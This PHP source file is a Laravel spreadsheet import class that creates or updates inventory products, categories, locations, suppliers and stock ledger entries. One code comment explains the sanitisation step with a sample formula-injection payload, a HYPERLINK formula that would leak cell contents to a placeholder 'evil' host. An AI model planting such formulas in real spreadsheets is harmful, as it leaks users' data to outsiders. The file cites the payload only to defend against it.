<?php

declare(strict_types=1);

namespace App\Imports;

use App\Models\Inventory\Product;
use App\Models\Inventory\ProductCategory;
use App\Models\Inventory\ProductLocation;
use App\Models\Inventory\StockAdjustment;
use App\Models\Inventory\Supplier;
use App\Models\User;
use App\Services\ProductLocationStockService;
use App\Services\ProductService;
use App\Support\ProductCurrencyColumns;
use App\Support\SpreadsheetSafety;
use Illuminate\Support\Arr;
use Illuminate\Support\Collection;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Validator;
use Maatwebsite\Excel\Concerns\SkipsFailures;
use Maatwebsite\Excel\Concerns\SkipsOnFailure;
use Maatwebsite\Excel\Concerns\ToCollection;
use Maatwebsite\Excel\Concerns\WithChunkReading;
use Maatwebsite\Excel\Concerns\WithHeadingRow;

/**
 * Import class for processing product data from Excel files.
 *
 * Handles importing and updating products from spreadsheet data,
 * including automatic creation of categories and locations.
 */
final class ProductsImport implements SkipsOnFailure, ToCollection, WithChunkReading, WithHeadingRow
{
    use SkipsFailures;

    /**
     * The organization ID to import products into.
     *
     * @var int
     */
    protected $organizationId;

    /**
     * Count of newly imported products.
     *
     * @var int
     */
    protected $imported = 0;

    /**
     * Count of updated existing products.
     *
     * @var int
     */
    protected $updated = 0;

    /**
     * Array of errors encountered during import.
     *
     * @var array
     */
    protected $errors = [];

    /**
     * Non-fatal warnings (e.g. duplicate SKUs collapsed within one file).
     *
     * @var array
     */
    protected $warnings = [];

    /**
     * SKUs already processed in this import, to detect intra-file duplicates.
     *
     * @var array<string, true>
     */
    protected $seenSkus = [];

    /**
     * Rows processed so far, so error/warning row numbers stay absolute across
     * chunks (WithChunkReading re-indexes each chunk from 0).
     */
    protected int $rowOffset = 0;

    /**
     * Whether unknown price_xxx columns have already been reported, so the
     * warning is raised once per file rather than once per row.
     */
    protected bool $unknownCurrenciesReported = false;

    /**
     * Create a new import instance.
     *
     * @param  int  $organizationId  The organization to import products into
     */
    /**
     * @param  User|null  $actor  who the stock ledger rows are attributed to
     *                            (the importing user; falls back to the signed-in user)
     */
    public function __construct($organizationId, private readonly ?User $actor = null)
    {
        $this->organizationId = $organizationId;
    }

    /**
     * Process each row in the collection
     */
    /**
     * Set an existing product's on-hand to the imported figure through the
     * stock ledger: a `recount` adjustment for the difference, under the
     * product row lock, with the location bins moved in step. A sheet
     * exported before a sale and re-imported after it therefore shows up as
     * an audited recount rather than silently overwriting the count.
     */
    private function bookImportedStock(Product $product, int $target): void
    {
        DB::transaction(function () use ($product, $target) {
            $locked = Product::withoutGlobalScopes()->whereKey($product->id)->lockForUpdate()->firstOrFail();
            $delta = $target - (int) $locked->stock;

            if ($delta === 0) {
                return;
            }

            $bins = app(ProductLocationStockService::class);

            // Draw bins down before the total falls (the lazy seed reads the
            // pre-change stock); book them up after it rises.
            if ($delta < 0) {
                $bins->consume($locked, -$delta);
            }

            StockAdjustment::adjust(
                $locked,
                $delta,
                'recount',
                'Product import',
                "Stock set to {$target} by import",
                actor: $this->actor,
            );

            if ($delta > 0) {
                $bins->receive($locked, $delta);
            }

            $product->setRawAttributes(array_merge($product->getAttributes(), ['stock' => $target]));
            $product->syncOriginal();
        });
    }

    public function collection(Collection $rows): void
    {
        foreach ($rows as $index => $row) {
            // Absolute row number across chunks (+2 for the header row and the
            // 0-based index).
            $rowNumber = $this->rowOffset + $index + 2;

            try {
                // Validate the row
                $currencyColumns = $this->currencyColumns($row->keys()->all(), $rowNumber);

                $rules = [
                    'name' => 'required|string|max:255',
                    'sku' => 'required|string|max:255',
                    'price' => 'required|numeric|min:0',
                    'stock' => 'required|integer|min:0',
                    'min_stock' => 'nullable|integer|min:0',
                ];
                foreach (array_keys($currencyColumns) as $key) {
                    $rules[$key] = 'nullable|numeric|min:0';
                }

                $validator = Validator::make($row->toArray(), $rules);

                if ($validator->fails()) {
                    $this->errors[] = [
                        'row' => $rowNumber,
                        'errors' => $validator->errors()->all(),
                    ];

                    continue;
                }

                // Collapse intra-file duplicate SKUs: keep the first occurrence
                // and warn, rather than silently letting a later row overwrite
                // the product created earlier in the same file.
                $sku = (string) $row['sku'];
                if (isset($this->seenSkus[$sku])) {
                    $this->warnings[] = [
                        'row' => $rowNumber,
                        'warnings' => ["Duplicate SKU '{$sku}' in this file; row skipped (first occurrence kept)."],
                    ];

                    continue;
                }
                $this->seenSkus[$sku] = true;

                // Find or create category
                $categoryId = null;
                if (! empty($row['category'])) {
                    $category = ProductCategory::firstOrCreate(
                        [
                            'name' => $row['category'],
                            'organization_id' => $this->organizationId,
                        ]
                    );
                    $categoryId = $category->id;
                }

                // Find or create location. Generate a unique 3-char-derived
                // code so importing "Toronto Main" and later "Toronto Backup"
                // doesn't produce two locations sharing code='TOR'.
                $locationId = null;
                if (! empty($row['location'])) {
                    $location = ProductLocation::firstOrCreate(
                        [
                            'name' => $row['location'],
                            'organization_id' => $this->organizationId,
                        ],
                        [
                            'code' => $this->uniqueLocationCode($row['location']),
                        ]
                    );
                    $locationId = $location->id;
                }

                // Check if product exists (by SKU) — include soft-deleted rows:
                // the SKU unique index counts them, so a plain lookup would miss
                // a trashed product and then collide on create. Restore + update
                // instead.
                $product = Product::withTrashed()
                    ->where('sku', $row['sku'])
                    ->where('organization_id', $this->organizationId)
                    ->first();

                // Convert status string to is_active boolean
                $status = $row['status'] ?? 'active';
                $isActive = strtolower($status) === 'active';

                // Strip leading formula triggers from imported strings so
                // a tenant-uploaded row that says
                //   name = =HYPERLINK("https://evil/?leak="&A2,"safe")
                // doesn't land in the DB and re-export to a downloader
                // whose spreadsheet viewer evaluates it.
                $sanitise = fn ($v) => SpreadsheetSafety::sanitiseImport($v);

                $productData = [
                    'name' => $sanitise($row['name']),
                    'sku' => $sanitise($row['sku']),
                    'barcode' => $sanitise($row['barcode'] ?? null),
                    'description' => $sanitise($row['description'] ?? null),
                    'category_id' => $categoryId,
                    'location_id' => $locationId,
                    'price' => $row['price'],
                    'currency' => $row['currency'] ?? 'USD',
                    'purchase_price' => $row['purchase_price'] ?? null,
                    'stock' => $row['stock'],
                    'min_stock' => $row['min_stock'] ?? 0,
                    'is_active' => $isActive,
                    'notes' => $sanitise($row['notes'] ?? null),
                    'organization_id' => $this->organizationId,
                ];

                if ($currencyColumns !== []) {
                    $productData['price_in_currencies'] = $this->mergeCurrencyPrices(
                        $product?->price_in_currencies,
                        $row,
                        $currencyColumns,
                    );
                }

                if ($product) {
                    // Update existing product, restoring it first if it was
                    // soft-deleted so re-importing a deleted SKU brings it back.
                    if ($product->trashed()) {
                        $product->restore();
                    }
                    // The sheet's stock is booked as a ledgered recount
                    // (locked, audited, binned), never written to the row.
                    $product->update(Arr::except($productData, ['stock']));
                    $this->bookImportedStock($product, (int) $row['stock']);
                    $this->updated++;
                } else {
                    // Create new product; its stock is an opening ledger row.
                    $product = DB::transaction(function () use ($productData) {
                        $created = Product::create($productData);
                        app(ProductService::class)->recordOpeningStock($created, $this->actor);

                        return $created;
                    });
                    $this->imported++;
                }

                $this->applyPrimarySupplier($product, $row, $rowNumber);
            } catch (\Exception $e) {
                $this->errors[] = [
                    'row' => $rowNumber,
                    'errors' => [$e->getMessage()],
                ];
            }
        }

        // Advance the absolute-row offset for the next chunk.
        $this->rowOffset += $rows->count();
    }

    /**
     * Link the row's primary supplier (supplier_code, else supplier_name) with
     * its supplier_sku and supplier_cost. An unknown supplier or a bad cost is
     * a row warning, never a failed row: the product itself is already saved.
     *
     * @param  Collection<string, mixed>|array<string, mixed>  $row
     */
    protected function applyPrimarySupplier(Product $product, $row, int $rowNumber): void
    {
        $code = trim((string) ($row['supplier_code'] ?? ''));
        $name = trim((string) ($row['supplier_name'] ?? ''));
        $sku = trim((string) ($row['supplier_sku'] ?? ''));
        $cost = trim((string) ($row['supplier_cost'] ?? ''));

        if ($code === '' && $name === '') {
            if ($sku !== '' || $cost !== '') {
                $this->warn($rowNumber, 'supplier_sku/supplier_cost ignored: add a supplier_code or supplier_name to link a supplier.');
            }

            return;
        }

        $suppliers = Supplier::withoutGlobalScopes()
            ->where('organization_id', $this->organizationId)
            ->whereNull('deleted_at');

        $supplier = $code !== ''
            ? (clone $suppliers)->where('code', $code)->first()
            : null;

        if (! $supplier && $name !== '') {
            $supplier = (clone $suppliers)->whereRaw('LOWER(name) = ?', [mb_strtolower($name)])->first();
        }

        if (! $supplier) {
            $label = $code !== '' ? $code : $name;
            $this->warn($rowNumber, "Supplier '{$label}' not found; the product was imported without a supplier link.");

            return;
        }

        $costPrice = null;
        if ($cost !== '') {
            if (is_numeric($cost) && (float) $cost >= 0) {
                $costPrice = round((float) $cost, 2);
            } else {
                $this->warn($rowNumber, "Invalid supplier_cost '{$cost}' ignored.");
            }
        }

        app(ProductService::class)->setPrimarySupplier($product, $supplier->id, [
            'supplier_sku' => $sku !== '' ? mb_substr((string) SpreadsheetSafety::sanitiseImport($sku), 0, 255) : null,
            'cost_price' => $costPrice,
        ]);
    }

    /**
     * The row's per-currency price columns (price_eur => EUR), limited to the
     * supported currencies. Unknown price_xxx columns are reported once.
     *
     * @param  array<int, int|string>  $keys
     * @return array<string, string>
     */
    protected function currencyColumns(array $keys, int $rowNumber): array
    {
        $columns = [];
        $unknown = [];

        foreach ($keys as $key) {
            $code = ProductCurrencyColumns::currencyFromImportKey((string) $key);
            if ($code === null) {
                continue;
            }

            if (ProductCurrencyColumns::isSupported($code)) {
                $columns[(string) $key] = $code;
            } else {
                $unknown[] = (string) $key;
            }
        }

        if ($unknown !== [] && ! $this->unknownCurrenciesReported) {
            $this->unknownCurrenciesReported = true;
            $this->warn($rowNumber, 'Unknown currency column(s) ignored: '.implode(', ', $unknown).'.');
        }

        return $columns;
    }

    /**
     * Apply the row's currency columns over the product's existing prices. A
     * filled cell sets that currency, a blank cell removes it, and currencies
     * without a column in the file are left untouched.
     *
     * @param  array<string, mixed>|null  $existing
     * @param  Collection<string, mixed>|array<string, mixed>  $row
     * @param  array<string, string>  $columns
     * @return array<string, float>|null
     */
    protected function mergeCurrencyPrices(?array $existing, $row, array $columns): ?array
    {
        $prices = array_change_key_case($existing ?? [], CASE_UPPER);

        foreach ($columns as $key => $code) {
            $value = $row[$key] ?? null;

            if ($value === null || trim((string) $value) === '') {
                unset($prices[$code]);
            } else {
                $prices[$code] = round((float) $value, 2);
            }
        }

        return $prices === [] ? null : $prices;
    }

    /**
     * Add a non-fatal warning for a row, merging with any it already has.
     */
    protected function warn(int $rowNumber, string $message): void
    {
        foreach ($this->warnings as $index => $warning) {
            if ($warning['row'] === $rowNumber) {
                $this->warnings[$index]['warnings'][] = $message;

                return;
            }
        }

        $this->warnings[] = ['row' => $rowNumber, 'warnings' => [$message]];
    }

    /**
     * Read the file in chunks so large uploads don't materialise the whole
     * sheet in memory and OOM the import worker.
     */
    public function chunkSize(): int
    {
        return 500;
    }

    /**
     * Get import statistics
     */
    public function getStats(): array
    {
        return [
            'imported' => $this->imported,
            'updated' => $this->updated,
            'errors' => $this->errors,
            'warnings' => $this->warnings,
        ];
    }

    /**
     * Generate a 3-character-derived location code that does not collide
     * with any existing location code in the same organisation. On
     * collision, append a numeric suffix until a free code is found.
     */
    protected function uniqueLocationCode(string $name): string
    {
        $base = strtoupper(substr($name, 0, 3));
        if ($base === '') {
            $base = 'LOC';
        }

        $code = $base;
        $suffix = 1;
        while (
            ProductLocation::where('organization_id', $this->organizationId)
                ->where('code', $code)
                ->exists()
        ) {
            $suffix++;
            $code = $base.'-'.$suffix;
        }

        return $code;
    }
}
